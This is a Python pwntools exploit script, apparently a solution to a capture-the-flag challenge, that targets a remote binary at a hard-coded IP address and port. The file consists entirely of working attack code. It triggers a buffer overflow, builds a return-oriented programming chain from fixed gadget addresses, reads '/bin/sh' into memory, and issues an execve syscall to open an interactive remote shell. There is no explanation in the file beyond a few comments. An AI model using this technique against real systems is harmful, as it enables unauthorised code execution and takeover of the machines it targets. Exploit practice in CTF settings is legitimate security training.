from pwn import *

p=remote("34.121.211.139", 3333)
#p=process("./chall")
e=ELF("./chall")

prdi=0x40077f
prsi=0x400791
prdx=0x400788
prax=0x40079a
mov=0x400774
syscall=0x4007a3
p.sendlineafter(":", "-29")
pause()

pay="A"*0x18
pay+=p64(prdi)+p64(0)
pay+=p64(prsi)+p64(e.bss()+0x100-0x8)
pay+=p64(prdx)+p64(0x300)
pay+=p64(prax)+p64(0)
pay+=p64(syscall)+p64(e.bss()+0x100)
pay+=p64(0x40084A)

p.sendlineafter(":", pay)

pay="/bin/sh\x00" # 0x601160
pay+=p64(0x601168)
pay+=p64(prdi)+p64(0x601158)
pay+=p64(prsi)+p64(0)
pay+=p64(prdx)+p64(0)
pay+=p64(prax)+p64(59)
pay+=p64(syscall)+p64(e.bss()+0x100)
p.send(pay)
# p.recvuntil("Goodbye!\n")
# sleep(0.5)
# leak=u64(p.recv(6).ljust(8,'\x00'))

# print hex(leak)

p.interactive()
